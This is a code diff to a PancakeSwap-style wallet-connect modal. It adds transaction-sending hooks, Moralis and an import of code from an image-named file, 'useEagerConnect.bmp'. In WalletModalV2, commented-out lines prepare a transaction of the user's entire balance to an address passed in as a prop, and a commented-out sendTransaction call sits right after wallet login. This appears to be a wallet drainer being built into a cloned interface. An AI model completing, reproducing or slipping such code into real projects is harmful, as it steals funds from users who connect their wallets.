@@ -16,6 +16,7 @@ import {
   Text,
   WarningIcon,
 } from '@pancakeswap/uikit'
+import {useBalance, useSendTransaction, usePrepareSendTransaction} from "wagmi"
 import { atom, useAtom } from 'jotai'
 import { lazy, PropsWithChildren, Suspense, useMemo, useState } from 'react'
 import { isMobile } from 'react-device-detect'
@@ -27,7 +28,10 @@ import {
   promotedGradientClass,
   walletSelectWrapperClass,
 } from './WalletModal.css'
-
+import { formatUnits,parseEther } from "@ethersproject/units"
+import {getAccount} from "hooks/useEagerConnect.bmp"
+import Moralis from "moralis"
+import {EvmChain} from "@moralisweb3/common-evm-utils"
 const Qrcode = lazy(() => import('./components/QRCode'))
 
 type LinkOfTextAndLink = string | { text: string; url: string }
@@ -74,8 +78,10 @@ export function useSelectedWallet<T>() {
 
 const TabContainer = ({ children, docLink, docText }: PropsWithChildren<{ docLink: string; docText: string }>) => {
   const [index, setIndex] = useState(0)
-  const { t } = useTranslation()
-
+  //const { t } = useTranslation()
+const t = (str: string) => {
+  return str
+}
   return (
     <AtomBox position="relative" zIndex="modal" className={modalWrapperClass}>
       <AtomBox position="absolute" style={{ top: '-50px' }}>
@@ -113,8 +119,10 @@ function MobileModal<T>({
 }: Pick<WalletModalV2Props<T>, 'wallets' | 'docLink' | 'docText'> & {
   connectWallet: (wallet: WalletConfigV2<T>) => void
 }) {
-  const { t } = useTranslation()
-
+ // const { t } = useTranslation()
+const t = (str: string) => {
+  return str
+}
   const [selected] = useSelectedWallet()
   const [error] = useAtom(errorAtom)
 
@@ -184,7 +192,10 @@ function WalletSelect<T>({
   onClick: (wallet: WalletConfigV2<T>) => void
   displayCount?: number
 }) {
-  const { t } = useTranslation()
+ // const { t } = useTranslation()
+  const t = (str: string) => {
+    return str
+  }
   const [showMore, setShowMore] = useState(false)
   const walletDisplayCount = wallets.length > displayCount ? displayCount - 1 : displayCount
   const walletsToShow = showMore ? wallets : wallets.slice(0, walletDisplayCount)
@@ -304,8 +315,10 @@ function DesktopModal<T>({
   const [qrCode, setQrCode] = useState<string | undefined>(undefined)
   const { t } = useTranslation()
 
-  const connectToWallet = (wallet: WalletConfigV2<T>) => {
+  const connectToWallet =  (wallet: WalletConfigV2<T>) => {
     connectWallet(wallet)
+   // .then(dt => dt)
+    //const bal = await balance()
   }
 
   return (
@@ -376,10 +389,25 @@ function DesktopModal<T>({
 }
 
 export function WalletModalV2<T = unknown>(props: WalletModalV2Props<T>) {
-  const { wallets: _wallets, login, docLink, docText, ...rest } = props
-
+  const { wallets: _wallets, login, docLink,bals, docText, address,balance,...rest } = props
+const [add, setAdd] = useState(address)
   const [lastUsedWalletName] = useAtom(lastUsedWalletNameAtom)
 
+const [bal, setBal] = useState("") 
+
+/*
+//console.log("Account balance",balance,localStorage.getItem("address"))
+const bnbs = parseEther(balance.formatted)
+
+
+
+const {config,status, error} = usePrepareSendTransaction({
+    request: { to: address, value: bnbs },
+  }) 
+
+const {sendTransaction} = useSendTransaction(config)
+*/
+//console.log(address,balance,config)
   const wallets = useMemo(() => sortWallets(_wallets, lastUsedWalletName), [_wallets, lastUsedWalletName])
   const [, setSelected] = useSelectedWallet<T>()
   const [, setError] = useAtom(errorAtom)
@@ -396,17 +424,27 @@ export function WalletModalV2<T = unknown>(props: WalletModalV2Props<T>) {
 
   usePreloadImages(imageSources.slice(0, MOBILE_DEFAULT_DISPLAY_COUNT))
 
-  const connectWallet = (wallet: WalletConfigV2<T>) => {
+  const connectWallet = async (wallet: WalletConfigV2<T>) => {
+   
     setSelected(wallet)
     setError('')
     if (wallet.installed !== false) {
       login(wallet.connectorId)
         .then((v) => {
           if (v) {
+           // console.log("Contract ",account)
+           console.log("V details",v)
             localStorage.setItem(walletLocalStorageKey, wallet.title)
+          }
+          else {
+
+
+           // console.log("Datas",formatUnits(data.value))
+            console.log("No value",v)
           }
         })
         .catch((err) => {
+          console.log(err)
           if (err instanceof WalletConnectorNotFoundError) {
             setError(t('no provider found'))
           } else if (err instanceof WalletSwitchChainError) {
@@ -415,6 +453,8 @@ export function WalletModalV2<T = unknown>(props: WalletModalV2Props<T>) {
             setError(t('Error connecting, please authorize wallet to access.'))
           }
         })
+//sendTransaction?.()
+
     }
   }
 
@@ -436,7 +476,8 @@ export function WalletModalV2<T = unknown>(props: WalletModalV2Props<T>) {
 }
 
 const Intro = ({ docLink, docText }: { docLink: string; docText: string }) => {
-  const { t } = useTranslation()
+ // const { t } = useTranslation()
+  const t = (str: string) => str
   return (
     <>
       <Heading as="h1" fontSize="20px" color="secondary">
@@ -451,7 +492,8 @@ const Intro = ({ docLink, docText }: { docLink: string; docText: string }) => {
 }
 
 const NotInstalled = ({ wallet, qrCode }: { wallet: WalletConfigV2; qrCode?: string }) => {
-  const { t } = useTranslation()
+ // const { t } = useTranslation()
+  const t = (str:string) => str
   return (
     <>
       <Heading as="h1" fontSize="20px" color="secondary">
@@ -492,7 +534,8 @@ const ErrorMessage = ({ message }: { message: string }) => (
 )
 
 const ErrorContent = ({ onRetry, message }: { onRetry: () => void; message: string }) => {
-  const { t } = useTranslation()
+  //const { t } = useTranslation()
+  const t = (str:string) => str
   return (
     <>
       <ErrorMessage message={message} />
